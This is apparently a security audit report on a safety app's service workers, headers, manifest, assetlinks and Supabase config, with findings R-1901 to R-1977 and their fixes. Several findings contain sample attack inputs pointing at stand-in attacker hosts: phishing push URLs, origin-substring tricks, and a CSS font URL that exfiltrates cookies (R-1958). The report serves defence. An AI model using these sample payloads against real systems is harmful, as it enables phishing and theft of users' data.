# ROOT AUDIT RESULTS — Wave 9, Batch F2

**Scope:** 10 files — Service Workers, manifest, headers, redirects, assetlinks, index.html, test HTML, guidelines, supabase config.
**ID range:** R-1901 → R-1980
**Date:** 2026-05-23

---

## DEFECTS

### `public/_headers`

- **R-1901 — P0 — Missing Security Headers (no CSP/HSTS/XFO/Permissions-Policy) — public/_headers:1-5**
  The entire `_headers` file contains ONLY Content-Type overrides for `/assets/*.js` and `/assets/*.css`. There is no `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, or `Cross-Origin-*` policies for ANY route.
  Root cause / Fix: Add a global `/*` block with strict CSP (script-src self + gstatic + supabase + stripe; object-src 'none'; frame-ancestors 'none'), HSTS `max-age=63072000; includeSubDomains; preload`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: geolocation=(self), microphone=(self), camera=(self), payment=(self)`.

- **R-1902 — P0 — Clickjacking Possible (no X-Frame-Options/frame-ancestors) — public/_headers:1-5**
  SOS-confirmation UI can be iframed on a malicious page, enabling tap-jacking of the "Send SOS" or "Cancel" button — attacker can trick a worker into cancelling a real distress signal or firing a fake one.
  Root cause / Fix: Add `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'`.

- **R-1903 — P0 — No HSTS → Active SSL-Strip Risk for Field Workers — public/_headers:1-5**
  Field workers regularly connect over hostile carrier networks / captive portals. Without HSTS, a network attacker can downgrade to HTTP on first visit and steal credentials + auth tokens.
  Root cause / Fix: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`.

- **R-1904 — P1 — Permissions-Policy Missing → Any Third-Party iframe Can Request Geolocation/Camera/Mic — public/_headers:1-5**
  No Permissions-Policy means any embedded resource may attempt geolocation/camera/microphone access, contradicting the WebView geolocation auto-grant chain (R-1786) defense-in-depth.
  Root cause / Fix: Set `Permissions-Policy: geolocation=(self), camera=(self), microphone=(self), payment=(self), usb=(), bluetooth=()`.

- **R-1905 — P1 — Missing Cross-Origin-Opener-Policy / Cross-Origin-Embedder-Policy — public/_headers:1-5**
  OAuth callback popup is vulnerable to cross-window scripting (XS-Leaks, Spectre). Without COOP/COEP, an attacker page can keep a handle to the OAuth window.
  Root cause / Fix: `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin`.

- **R-1906 — P2 — Service Worker Files Have No Explicit Cache-Control — public/_headers:1-5**
  `/sw.js` and `/firebase-messaging-sw.js` have no `Cache-Control: no-cache` header, meaning intermediaries / browsers may cache an old SW indefinitely and prevent emergency fixes from rolling out.
  Root cause / Fix: Add a section `/sw.js` and `/firebase-messaging-sw.js` with `Cache-Control: no-cache, no-store, must-revalidate`.

- **R-1907 — P2 — manifest.json + .well-known/assetlinks.json Missing Required Content-Type — public/_headers:1-5**
  Some CDNs / browsers will refuse assetlinks.json if served as anything other than `application/json`; manifest must be `application/manifest+json` for full PWA installability. Missing → App Links binding silently breaks and PWA install banner may not fire.
  Root cause / Fix: Add `/.well-known/assetlinks.json` → `Content-Type: application/json` and `/manifest.json` → `Content-Type: application/manifest+json`.

- **R-1908 — P2 — No CSP report-uri / report-to — public/_headers:1-5**
  Even when CSP is added, no reporting means CSP violations (injection attempts) go undetected in the wild.
  Root cause / Fix: Add `report-uri` / `report-to` pointing to an ingest endpoint.

---

### `public/_redirects`

- **R-1909 — P1 — Catch-all `/*  /index.html  200` Swallows .well-known and Static Paths — public/_redirects:6**
  The terminal `/*  /index.html  200` rewrites EVERYTHING that isn't matched by earlier rules. There is no exclusion for `/.well-known/*` (assetlinks, security.txt, apple-app-site-association) or `/sw.js`, `/firebase-messaging-sw.js`. If a user requests `/.well-known/assetlinks.json` and Netlify/CF Pages serves the rewrite for any reason (cold cache, path-normalization edge case), Android will get HTML and App Links binding silently fails — Android intents will leak back to the browser where session hijack chains can run.
  Root cause / Fix: Add explicit pass-throughs above the catch-all: `/.well-known/* /:splat 200!`, `/sw.js /sw.js 200!`, `/firebase-messaging-sw.js /firebase-messaging-sw.js 200!`. Use `!` to force.

- **R-1910 — P2 — `/demo  /index.html  200` Unconditional Rewrite — public/_redirects:5**
  `/demo` always serves the app shell; if a demo tenant is later removed there is no 410/404, search engines keep ranking dead path, and confused users see a broken React route.
  Root cause / Fix: Either remove rule or rewrite to a real `/demo` static page.

- **R-1911 — P3 — No Locale-Aware Redirect → `/`, `/app`, `/dashboard` All Coexist — public/_redirects:1-6**
  Three different "entry" rewrites with no canonical → SEO ambiguity and inconsistent service-worker scope (SHELL_PATHS in sw.js includes all three).
  Root cause / Fix: Pick one canonical entry (`/app`) and 301 the others.

---

### `public/.well-known/assetlinks.json`

- **R-1912 — P0 — Single SHA-256 Fingerprint — No Play App Signing Key Listed — public/.well-known/assetlinks.json:9-10**
  Only ONE fingerprint is present. When Google Play App Signing is enabled (default for new apps), Play re-signs the APK with its own upload key. The fingerprint here looks like a local debug/release keystore (matches the keystore committed in repo per R-1792). If the published app is signed by Play's distribution key, Android verifies that key — NOT this one — and Digital Asset Links binding FAILS, meaning all https://sosphere.co links open in the browser instead of the app and are subject to clickjacking + token-leak chains.
  Root cause / Fix: Add BOTH the upload-key fingerprint AND the Play App Signing fingerprint (from Play Console → Setup → App integrity). The array MUST contain every signing identity that may sign a production install.

- **R-1913 — P0 — Fingerprint Likely Belongs to Committed Keystore (R-1792 Cross-Reference) — public/.well-known/assetlinks.json:10**
  Cross-reference to R-1792: keystore password is committed in repo. If the SHA-256 above corresponds to the in-repo keystore, ANY contributor (or anyone who clones the repo) can sign a malicious APK whose package_name == `com.sosphere.app` AND whose fingerprint matches this entry → Android will accept it as the legitimate first-party handler of `https://sosphere.co/*` deep links, intercepting OAuth callbacks, password resets, magic links, and SOS deep-links.
  Root cause / Fix: Rotate the signing key immediately, remove keystore from repo, switch to Play App Signing, and update assetlinks.json with the new fingerprint(s).

- **R-1914 — P1 — Only `delegate_permission/common.handle_all_urls` — No `get_login_creds` — public/.well-known/assetlinks.json:3-5**
  Without `delegate_permission/common.get_login_creds`, Smart Lock / Credential Manager cannot share saved credentials between web and app — users on Android will be forced to re-enter passwords, increasing phishing exposure (they'll type into anything that looks similar).
  Root cause / Fix: Add a second relation entry for `get_login_creds` if Credential Manager / Autofill integration is desired.

- **R-1915 — P2 — No Wildcard / Multi-Package Coverage — public/.well-known/assetlinks.json:7-8**
  Only `com.sosphere.app` is declared. Internal-test, beta, or `.dev` variants (`com.sosphere.app.dev`, `.beta`) will not bind, forcing testers through the browser path (less secure).
  Root cause / Fix: Add separate entries for each package variant.

---

### `public/manifest.json`

- **R-1916 — P1 — Missing `scope` Field — Allows Cross-Path Phishing PWA — public/manifest.json:1-24**
  Without `"scope": "/"` (or `/app`) the PWA scope falls back to start_url's directory. A malicious sub-app on the same origin could register itself as a PWA, and the installed icon would look legitimate but launch into the attacker's path.
  Root cause / Fix: Add `"scope": "/"` (or `"/app"` to match `start_url`).

- **R-1917 — P1 — Missing `id` Field — Origin/Path Spoof on Re-install — public/manifest.json:1-24**
  Without `"id"`, the PWA identity is derived from start_url; if the start_url ever changes, browsers treat the new manifest as a different app and the user may end up with two "SOSphere" icons, one of which could be stale and serve an old cached SW exploit.
  Root cause / Fix: Add `"id": "/app"` (stable identifier).

- **R-1918 — P2 — `purpose: "any maskable"` on Both Icon Sizes — public/manifest.json:15,21**
  Combining "any" and "maskable" in the same icon causes Android to crop the icon as if it were maskable (with safe zone padding), producing a small/centered SOSphere logo on the launcher. For a life-safety app the icon must be instantly recognisable — small crop is a UX hazard.
  Root cause / Fix: Provide two separate icon entries per size: one with `"purpose": "any"` and one with `"purpose": "maskable"` (the maskable one must be designed with proper safe-zone padding).

- **R-1919 — P2 — No `prefer_related_applications` / `related_applications` — public/manifest.json:1-24**
  When the native Android app is installed, the PWA should defer to it. Currently both will appear and the user may install both, getting different push tokens and missing SOS notifications.
  Root cause / Fix: Add `"prefer_related_applications": true` and a `related_applications` entry pointing at the Play Store URL + `com.sosphere.app`.

- **R-1920 — P2 — Missing `screenshots`, `categories`, `lang`, `dir` — public/manifest.json:1-24**
  No `"lang": "ar"` / `"dir": "rtl"` — but the index.html is `lang="ar" dir="rtl"`. PWA install prompt and home-screen label will render LTR / wrong-locale on some launchers, hurting recognition by Arabic-first field workers in an emergency.
  Root cause / Fix: Add `"lang": "ar"`, `"dir": "rtl"`, `"categories": ["safety","productivity"]`.

- **R-1921 — P2 — No `shortcuts` for SOS Trigger — public/manifest.json:1-24**
  A life-safety PWA should expose a long-press home-screen shortcut "Send SOS" so the user does not need to wait for the app to fully load. Currently no shortcuts defined.
  Root cause / Fix: Add `shortcuts: [{name:"Send SOS", url:"/app?sos=1"}]`.

---

### `public/sw.js`

- **R-1922 — P0 — `SHELL_PATHS` Caches `/dashboard` — Stale Pre-Login Shell Served to Logged-Out User — public/sw.js:64,82**
  `/dashboard` is precached and matched by SHELL_PATHS. After a user logs out, the SW will still serve the cached `/dashboard` HTML (which may be empty React shell, but matters if SSR/HTML differs by auth). Worse: the precached HTML is captured at first install and never refreshed unless CACHE_NAME bumps — so a critical security patch to inline boot script (the OAuth detection logic in index.html) does not propagate until SW activates.
  Root cause / Fix: Use network-first for navigation/HTML requests, cache-first only for asset patterns; bump CACHE_NAME on every release.

- **R-1923 — P0 — Push Handler Trusts Server-Provided `url` Without Origin Validation — public/sw.js:196,212-218**
  `data.url` from push payload is used directly as `targetUrl` for `openWindow(targetUrl)` / `client.navigate`. If an attacker controls any push origin (compromised FCM project key, malicious server insertion, or rogue tenant), they can send `url: "https://attacker.example/phish"` and the SW will open that URL when the user taps a notification — phishing the SOS user during an emergency.
  Root cause / Fix: Whitelist `targetUrl` to same-origin paths only: parse with `new URL(targetUrl, self.location.origin)` and assert `.origin === self.location.origin`; fall back to `/dashboard` otherwise.

- **R-1924 — P0 — `notificationclick` Loose URL Match `client.url.includes('sosphere')` — public/sw.js:225**
  `client.url.includes('sosphere')` is a substring check — any URL containing the literal text `sosphere` matches, e.g., `https://evil.com/?ref=sosphere` or a previously-opened phishing tab. The SW would focus the attacker's tab and postMessage the notification data to it, leaking callId/url/type/PII to the attacker.
  Root cause / Fix: Strict equality check on `new URL(client.url).origin === self.location.origin`.

- **R-1925 — P1 — Push `data` Spread Overrides url/callId/type — public/sw.js:195-200**
  The constructed `data` object spreads `...data` AFTER setting `url`, `callId`, `type`. If the incoming payload contains top-level `url`/`callId`/`type` they overwrite the sanitized values. Combined with R-1923, a server-controlled push can fully override what `notificationclick` later reads.
  Root cause / Fix: Spread first, then override with sanitized keys: `{...data, url: safeUrl, callId: safeCallId, type: safeType}`.

- **R-1926 — P1 — `skipWaiting` + `clients.claim` Unconditionally on Install/Activate — public/sw.js:102,111**
  A new SW takes over immediately without notifying open clients. If the new SW contains a regression in the push pipeline (lifesaving notifications), every existing tab/PWA instance picks it up silently and the user has no recovery path until next deployment.
  Root cause / Fix: Gate `skipWaiting()` behind explicit `SKIP_WAITING` postMessage from the page (already supported on line 248-250 — just remove the unconditional call on 102).

- **R-1927 — P1 — `message` Handler Will skipWaiting on ANY Origin — public/sw.js:248-250**
  `event.data.type === 'SKIP_WAITING'` is honored without checking `event.source.origin`. A cross-origin iframe loaded into the app (or a compromised script) can postMessage `{type:'SKIP_WAITING'}` to force-promote a half-installed SW mid-emergency.
  Root cause / Fix: Validate `event.origin === self.location.origin` before honoring control messages.

- **R-1928 — P1 — Silent Push Not Handled — public/sw.js:157-203**
  A push with empty `event.data` (silent push, used by FCM for keep-alive / token refresh) still calls `showNotification('SOSphere Alert', 'Emergency notification')` because of the catch-all `data = { title: 'SOSphere Alert', body: 'Emergency notification' }` and unconditional `event.waitUntil(showNotification(...))`. Browsers PENALIZE silent pushes by deregistering the push subscription if too many fire without UI — meaning legitimate SOS pushes later get dropped. Inverse: if push fires with no body, user sees a meaningless fake-emergency toast.
  Root cause / Fix: Detect empty payloads (`!event.data` or no useful keys), and either skip OR show a minimal "Checking…" notification then close it.

- **R-1929 — P1 — `kind.indexOf('sos_') === 0` Allows Spoofed Lifesaving Notifications — public/sw.js:168**
  Any push containing `kind: "sos_anything"` is escalated to `requireInteraction: true` + action buttons. A spammy / malicious push can permanently occupy the screen — a denial-of-service against legitimate SOS visibility (operator sees 20 fake "sos_" toasts, dismisses, misses real one).
  Root cause / Fix: Validate `kind` against a known allow-list (`sos_self_confirm`, `sos_responder_assigned`, `sos_resolved`, etc.) before honoring `isLifesaving`.

- **R-1930 — P1 — `tag` Falls Back to `Date.now()` — Defeats Notification Coalescing — public/sw.js:176**
  When neither `data.tag` nor `data.callId` is set, every push gets a unique tag. `renotify: true` means each will buzz separately. A burst of 50 server retries during an outage will buzz the owner 50 times → notification fatigue → owner mutes the app → next SOS is silent.
  Root cause / Fix: Use a stable category fallback (`tag: data.tag || data.callId || data.kind || 'sosphere-general'`).

- **R-1931 — P2 — `caches.match(event.request)` Returns Pre-Logout Static — public/sw.js:132-133**
  After auth state changes, cached static `.js` chunks for the previous user/version remain in cache and are served if the network is offline. If a critical security patch shipped in `assets/main-abc.js`, the offline user still runs the vulnerable chunk indefinitely.
  Root cause / Fix: Cache validation should also check `cache-control: max-age` against now and expire stale entries.

- **R-1932 — P2 — `fetch` Handler Catches All Errors as Network Failure — public/sw.js:128-135**
  Any throw inside the try (including a synchronous bug in `shouldCacheResponse`, JSON parse, etc.) is swallowed and treated as "network failed" → serves cached version. A bug in caching path can silently downgrade users to stale content.
  Root cause / Fix: Distinguish network errors (TypeError from fetch) from logic errors; rethrow non-network errors.

- **R-1933 — P2 — `event.respondWith` Returns Cached Response With Original Cache-Control — public/sw.js:127**
  Returned cached responses still bear their original `Cache-Control` header so browsers may apply additional caching layers on top.
  Root cause / Fix: Strip / rewrite cache-control on `cached` before returning.

- **R-1934 — P2 — `STATIC_PRECACHE` Includes `/manifest.json` — Stale Manifest Pinned — public/sw.js:32**
  Manifest is precached on first install and never updated until CACHE_NAME bumps — so changes to PWA name, icons, start_url do not roll out to existing installs.
  Root cause / Fix: Remove `/manifest.json` from precache or use network-first for it.

- **R-1935 — P2 — No `navigationPreload` — public/sw.js:98-112**
  Navigation requests intercepted by the SW pay a full SW-spin-up cost before fetching. For dashboard / app shell on a slow network this adds 200-500ms before SOS UI is interactive.
  Root cause / Fix: `self.addEventListener('activate', e => e.waitUntil(self.registration.navigationPreload?.enable()))`.

- **R-1936 — P3 — `console.warn` Inside Production SW — public/firebase-messaging-sw.js:46**
  Logs leak to DevTools console; consider routing through a guarded debug flag.

---

### `public/firebase-messaging-sw.js`

- **R-1937 — P0 — Hardcoded Firebase apiKey/projectId Committed in SW — public/firebase-messaging-sw.js:22-29**
  Even though "public Firebase config" is commonly defended as not-secret, this file leaks `projectId: "sosphere-809bb"`, `messagingSenderId: "143943152533"`, `appId`, and `apiKey`. The apiKey is "restricted by Firebase security rules + HTTP referrer restrictions" PER the comment — but referrer restrictions are bypassed by attackers who omit referrer or origin-spoof. Combined with weak Firestore/RTDB security rules anywhere in the project, this is a direct anonymous-quota burn vector AND enables abusive token enrollment to spam push to legitimate device tokens.
  Root cause / Fix: Apply STRICT Firebase Security Rules (default-deny), enable App Check enforcement so the apiKey is useless without a valid attestation token, and apply Firebase Cloud Messaging Server Key restrictions.

- **R-1938 — P0 — `importScripts` From `gstatic.com` With No SRI — public/firebase-messaging-sw.js:19-20**
  `firebase-app-compat.js` and `firebase-messaging-compat.js` are loaded from a third-party CDN with NO integrity hash, NO version pin to a hash, just a version number. If gstatic is ever compromised (or an attacker can MITM the SW install request — note the no-HSTS finding R-1903), the attacker controls the SW that has full notification + cache + network interception powers on every user's device, persistently.
  Root cause / Fix: Self-host firebase SDK files under `/assets/firebase/` and add SRI on imports; or pin version + SRI on importScripts (note: SRI on importScripts is supported in modern browsers via the `integrity` option of the second-arg).

- **R-1939 — P0 — `notificationclick` Uses Server-Provided `deep_link` Without Validation — public/firebase-messaging-sw.js:66,72,75**
  `event.notification.data?.deep_link || "/dashboard"` is passed directly to `w.navigate(url)` / `clients.openWindow(url)`. An attacker who can push to this app (see R-1937 apiKey discussion) can craft `deep_link: "https://evil/"` → notification tap navigates the focused PWA window cross-origin into a phishing site that looks like SOSphere (because the user was just inside SOSphere).
  Root cause / Fix: Same as R-1923 — same-origin assertion on `deep_link` before navigate/openWindow.

- **R-1940 — P0 — Loose URL Match `w.url.includes(self.location.origin)` — public/firebase-messaging-sw.js:70**
  Same flaw as R-1924 in the FCM SW. `String.includes` of the origin substring matches `https://attacker.com/?p=https://sosphere.co` if such a tab is open. Focus + navigate that tab.
  Root cause / Fix: Strict origin equality.

- **R-1941 — P1 — `requireInteraction` Only on `sos_self_confirm` — public/firebase-messaging-sw.js:57**
  This SW is FCM-only path. It sets `requireInteraction` ONLY when `kind === 'sos_self_confirm'`. The hardened sw.js handles a broader `isLifesaving` (R-1929 caveats aside). When messages arrive via FCM background path (this SW), the broader lifesaving rule does NOT apply — owner can miss an SOS that arrives via the FCM channel because the toast vanishes in 4 seconds.
  Root cause / Fix: Mirror the `isLifesaving` rule from sw.js (with allow-list) in this FCM SW.

- **R-1942 — P1 — Unconditional `skipWaiting` + `clients.claim` — public/firebase-messaging-sw.js:38-39**
  Same hijack-style concern as R-1926 — new FCM SW takes over without consent. Mid-emergency a deploy could break push pipeline silently.
  Root cause / Fix: Same — gate behind explicit page-driven SKIP_WAITING.

- **R-1943 — P1 — `messaging.onBackgroundMessage` Inside `else` Branch After Sync `isSupported` — public/firebase-messaging-sw.js:45-61**
  If isSupported() returns false (older Android WebView, some embedded browsers), background push is DEAD with only a console.warn. There is no fallback registration to native `push` handler, so the device receives no SOS pushes silently.
  Root cause / Fix: When `!isSupported`, register a raw `self.addEventListener('push', …)` fallback that handles the FCM data envelope manually.

- **R-1944 — P1 — `notificationclick` Calls `w.navigate(url)` Without Awaiting Focus — public/firebase-messaging-sw.js:71-72**
  `w.focus()` returns a promise but is not awaited; `w.navigate(url)` may fire before focus actually completes, causing the window to navigate in background (Chrome bug history). The user taps the SOS toast, expects to see emergency, but the navigation happens in an unfocused tab they never look at.
  Root cause / Fix: `await w.focus(); return w.navigate(url);` and ensure handler returns the chained promise to `event.waitUntil`.

- **R-1945 — P1 — `payload.data` Is Spread Into Notification `data` Field Unsanitised — public/firebase-messaging-sw.js:55**
  Whatever the server places in `payload.data` (which can include trust-elevation fields like `role`, `tenantId`) is later available to the `notificationclick` handler in this SW AND postMessage'd to clients. Allows server-pushed data to influence client state without auth checks.
  Root cause / Fix: Whitelist allowed `data` keys (kind, deep_link [post-validation], callId).

- **R-1946 — P2 — `tag: payload.data?.kind || "sosphere"` Collapses Multiple SOS into One — public/firebase-messaging-sw.js:56**
  All SOS notifications of the same kind reuse the same tag → second SOS replaces first toast silently. If owner has not acknowledged the first, the second SOS is invisible.
  Root cause / Fix: Use `tag: payload.data?.callId || payload.data?.kind || \`sos-\${Date.now()}\``.

- **R-1947 — P2 — No `vibrate` Pattern on FCM Path — public/firebase-messaging-sw.js:51-58**
  sw.js sets vibrate patterns by severity; this FCM SW does not, so background-FCM-delivered SOS is silent vibration → owner misses tactile signal.
  Root cause / Fix: Mirror the vibrate logic.

- **R-1948 — P2 — No `actions` Buttons on FCM Path — public/firebase-messaging-sw.js:51-58**
  sw.js exposes View/Dismiss action buttons; this SW does not, so owner cannot fast-act from the notification shade.
  Root cause / Fix: Add the same actions array.

- **R-1949 — P2 — Two Coexisting SWs Compete For Notification Display — public/firebase-messaging-sw.js + public/sw.js**
  Both SWs are registered; FCM messages dispatch to firebase-messaging-sw.js path AND the same data may arrive as a push to sw.js (FCM webpush sometimes routes via the default SW). Result: duplicate notifications OR silent miss if Firebase deduplicates while the app SW does not see it.
  Root cause / Fix: Have firebase-messaging-sw.js delegate to sw.js's `push` logic via shared module, OR explicitly disable one display path.

- **R-1950 — P2 — `importScripts` Pinned to `12.12.1` But No Lockdown — public/firebase-messaging-sw.js:19-20**
  Version pin protects against bumps but a CDN host compromise still flips bytes for that exact URL. SRI needed (also see R-1938).
  Root cause / Fix: Add SRI integrity hashes.

- **R-1951 — P3 — Comments Encode "All values below are PUBLIC" — Misleading — public/firebase-messaging-sw.js:14-16**
  Comment trains reviewers to ignore apiKey leakage. While technically correct in Firebase's threat model, it provides a false sense of safety given the abuse vectors (R-1937).
  Root cause / Fix: Rephrase to note App Check and security-rules dependency.

---

### `index.html`

- **R-1952 — P1 — No Meta-CSP Fallback — index.html:37-39**
  Only `X-Content-Type-Options` and `referrer` meta are present. No `<meta http-equiv="Content-Security-Policy">` as a defense-in-depth fallback if `_headers` is misconfigured (which it is — see R-1901).
  Root cause / Fix: Add a meta CSP at minimum locking down script-src to self + gstatic + supabase + stripe.

- **R-1953 — P1 — Inline Scripts With No Nonce — index.html:54-68, 69-84**
  Two inline `<script>` blocks defining `window.onerror`, `window.__bootTime`, `window.__isOAuthCallback`, `window.__delayReactMount`. Once a real CSP is added, these will be blocked unless given a nonce. The `window.__isOAuthCallback` global is also reachable from any script (3rd-party SDK, future XSS) and can be spoofed to bypass the boot-delay logic.
  Root cause / Fix: Move inline logic to a hashed external script; require `script-src 'self' 'nonce-…'`.

- **R-1954 — P1 — `viewport-fit=cover` + `maximum-scale=1.0, user-scalable=no` — Accessibility / Safety — index.html:5**
  Field workers in stress may need to zoom (eyesight impaired, gloves, sun glare). Disabling user-scaling defeats accessibility — and during an SOS, can prevent reading critical info.
  Root cause / Fix: Remove `maximum-scale=1.0, user-scalable=no`.

- **R-1955 — P1 — OAuth Callback Detection on `window.location.hash` Only — index.html:73**
  `window.location.hash.indexOf('access_token') !== -1` only detects hash-based OAuth flows. PKCE flows return `?code=` in query string. Detection misses PKCE → the 1.5s boot-delay still runs → already-noted R-* concern about lost code-verifier. The comment in index.html (lines 55-62) describes this exact failure mode — the fix did not cover query-string callbacks.
  Root cause / Fix: Also check `window.location.search.includes('code=')`.

- **R-1956 — P2 — `window.onerror` Renders Raw Error Text Into DOM — index.html:64-67**
  `el.textContent = 'Error: ' + msg + ' (line ' + line + ')';` — `msg` is from browser, generally safe but if an error includes user-supplied URL fragments / hashes (postMessage validation failures, etc.), they end up on screen. Low risk because textContent (not innerHTML) is used, but it can leak sensitive runtime values (tokens in error messages).
  Root cause / Fix: Strip / truncate `msg` before rendering; never include URL or token text.

- **R-1957 — P2 — Boot Status Element Survives After Mount → Persistent DOM Leak — index.html:49-52**
  `#boot-status` is created in initial HTML and React may not always remove it; window.onerror writes to it indefinitely so a runtime error after mount appears overlaid.
  Root cause / Fix: Remove element in React mount lifecycle.

- **R-1958 — P2 — Fonts Loaded Cross-Origin With No SRI — index.html:42-43**
  Google Fonts CSS loaded as `<link rel="stylesheet">` from `fonts.googleapis.com` with no integrity. The CSS itself contains URLs to fonts.gstatic.com font binaries. Compromise of fonts.googleapis.com CSS lets attacker inject `font-display: optional; src: url("https://evil/x?leak=COOKIES")` to exfiltrate via Referer.
  Root cause / Fix: Self-host fonts (already in `/fonts/`?) or add SRI; better, ship subset WOFF2 files locally.

- **R-1959 — P2 — `preconnect` to fonts.googleapis.com Leaks IP On Every Load — index.html:41**
  Worker IP geolocated on Google's edge each visit — privacy regression and uplift signal for Google about your user base.
  Root cause / Fix: Self-host fonts.

- **R-1960 — P2 — `crossorigin` On preconnect But Not On stylesheet Link — index.html:41-42**
  Mismatched `crossorigin` attributes cause double preconnects (one credentialed, one not), wasting cycles and creating an extra trackable fingerprint signature.
  Root cause / Fix: Match the `crossorigin` value on both tags.

- **R-1961 — P2 — Boot Delay 1.5s Adds Death-Risk to SOS Launch — index.html:74-83**
  `__delayReactMount` adds a fixed 1500ms before mounting React. For an SOS app, this is 1.5 seconds the worker has the boot screen instead of the SOS button. The OAuth bypass exists but no SOS bypass.
  Root cause / Fix: Skip delay if URL contains `?sos=1` (or always — boot screen UX cost vs. response latency tradeoff favors instant mount).

- **R-1962 — P3 — `<html lang="ar" dir="rtl">` Fixed Despite Multi-Locale Manifest — index.html:2**
  Hardcoded ar/rtl in HTML even though Open Graph declares `og:locale:alternate "en_US"`. Search engines / assistive tech get conflicting signals.
  Root cause / Fix: Set dynamically based on user language after JS boot.

- **R-1963 — P3 — `<title>` Differs From og:title — index.html:24,44**
  Mismatched titles for SEO / preview links.
  Root cause / Fix: Sync.

---

### `test-phone-input.html`

- **R-1964 — P1 — Production-Reachable Test Page → Disclosure of Internal Test IDs (R-86) — test-phone-input.html:1-149**
  This is a developer test harness with literal `<button onclick="..."></button>` inline handlers. It is shipped in the repo root and likely served at https://sosphere.co/test-phone-input.html. Reveals internal ticket IDs (R-86, R-84), internal triage language ("سأعيد تصميم الـ component"), and a modal mockup. Provides reconnaissance to attackers about the bug-tracking schema.
  Root cause / Fix: Move to `/dev/` route excluded from prod build; or gate behind auth; or 404 it via _redirects.

- **R-1965 — P1 — Inline `onclick` Handlers Will Be Blocked By Real CSP — test-phone-input.html:118,123,124,137**
  Once CSP is added (R-1901), inline event handlers break. Demonstrates that the codebase pattern uses inline handlers — likely repeated elsewhere in the React build output.
  Root cause / Fix: Remove file from production; if kept, refactor to addEventListener.

- **R-1966 — P2 — Test Page Includes Hand-Typed Iraqi Dial Code +964 — test-phone-input.html:82,107,134**
  Discloses target geography to anyone hitting the URL — minor recon value but a tell.
  Root cause / Fix: Remove from prod.

- **R-1967 — P2 — Test Page Has No CSP / SRI / Security Meta — test-phone-input.html:3-7**
  Demonstrates pattern of shipping HTML pages with zero security headers in this repo.
  Root cause / Fix: Remove or harden.

---

### `guidelines/Guidelines.md`

- **R-1968 — P1 — Guidelines.md Is Empty — guidelines/Guidelines.md (0 bytes)**
  A life-safety platform must have written engineering guidelines (security review checklist, deployment gates, push notification SLAs). The file exists as scaffolding but contains nothing — engineers have no documented standards to follow, meaning every change goes through tribal-knowledge review.
  Root cause / Fix: Populate with at minimum: SOS pipeline SLAs, push-notification testing requirements, CSP/security-header requirements, mandatory smoke tests before deploy.

---

### `supabase/config.toml`

- **R-1969 — P0 — Auth `site_url = "http://localhost:3000"` In Committed Config — supabase/config.toml:20**
  If this config is ever applied to a non-local environment (CI deploy, staging push) the OAuth/magic-link redirect target becomes `http://localhost:3000`, breaking auth AND, if an attacker can squat `localhost:3000` via DNS rebinding / browser misconfig on a user machine, they may intercept the auth token. Also: HTTP (not HTTPS) means token in clear if applied.
  Root cause / Fix: Use env interpolation (`site_url = "env(SITE_URL)"`) or move site_url to a non-committed env override per environment.

- **R-1970 — P0 — Studio Enabled in Committed Config (`port = 54323`) — supabase/config.toml:13-16**
  `[studio]` block enables Supabase Studio on port 54323 — full DB admin UI with NO auth in default local config. If this config is shipped to a remote host (or if the dev machine binds to a public interface), Studio is reachable and offers full schema/table/RLS bypass to anyone.
  Root cause / Fix: Disable studio for any non-local env; explicitly `enabled = false` for production overrides.

- **R-1971 — P0 — 14 Edge Functions With `verify_jwt = false` — supabase/config.toml:22-111**
  Twilio/Stripe/SOS/health/probe functions ALL disable JWT verification at the gateway. While most have an in-function signature/PROBE_SECRET check, this is a single-point-of-failure pattern: any developer adds a new function and forgets the in-function check → totally unauthenticated emergency endpoint. Specifically `sos-alert` (line 31-32) is the SOS fan-out endpoint — `verify_jwt = false` means anyone on the internet can trigger SOS fan-out if the function's in-code auth has any bug.
  Root cause / Fix: Audit each `verify_jwt = false` function and confirm the in-function authn. For `sos-alert` consider switching to `verify_jwt = true` if it's called from authed contexts.

- **R-1972 — P1 — `extra_search_path = ["public", "extensions"]` — Search Path Hijack — supabase/config.toml:5**
  `extensions` schema on the search_path means any object created in `extensions` shadows `public` lookups. If a malicious extension or migration creates `extensions.users` it could intercept queries meant for `public.users`.
  Root cause / Fix: Remove `extensions` from search_path; reference extension objects fully qualified.

- **R-1973 — P1 — `max_rows = 1000` On API — DoS / Bulk Exfil — supabase/config.toml:6**
  PostgREST returns up to 1000 rows per request. Any RLS bug or authed user can iterate to dump tables in 1000-row chunks. For a tenant-scoped emergency app, 1000 PII rows per request is a bulk-exfil amplifier.
  Root cause / Fix: Lower to 100 (matches typical UI page-size) and force pagination.

- **R-1974 — P1 — No `[auth.email]` Rate Limit / OTP Settings Set — supabase/config.toml:18-20**
  `[auth]` block only sets `enabled` and `site_url`. No `otp_expiry`, `password_min_length`, `signup_disabled`, `email.max_frequency`, `email.otp_length`, `email.otp_exp`, `mfa.totp.enroll_enabled`, etc. Defaults apply — defaults are NOT strong enough for a life-safety app (e.g., 6-digit OTP, 60s rate limit, weak password policy).
  Root cause / Fix: Explicitly set hardened auth params (min password 12+, OTP 8 digits with low expiry, mandatory MFA for owner/admin).

- **R-1975 — P1 — No JWT Expiry Set → 3600s Default — supabase/config.toml:18-20**
  Default `jwt_expiry = 3600` (1 hour) is fine for general SaaS but on a shared device used by rotating field workers, an hour-long captured token is a long window. For owners with elevated permissions this is even worse.
  Root cause / Fix: Tighten `[auth] jwt_expiry = 900` (15 min) with refresh token rotation enabled; for sensitive endpoints require recent-auth re-prompt.

- **R-1976 — P2 — `sos-health` `verify_jwt = false` — Information Disclosure — supabase/config.toml:87-88**
  Public health endpoint can leak version, build hash, DB connection status, tenant counts. Helps attacker reconnaissance and timing of attacks (e.g., during deploy windows).
  Root cause / Fix: Return only minimal `{status:"ok"}` and gate detailed responses behind an admin auth.

- **R-1977 — P2 — Probe Functions Reachable Publicly — supabase/config.toml:62-105**
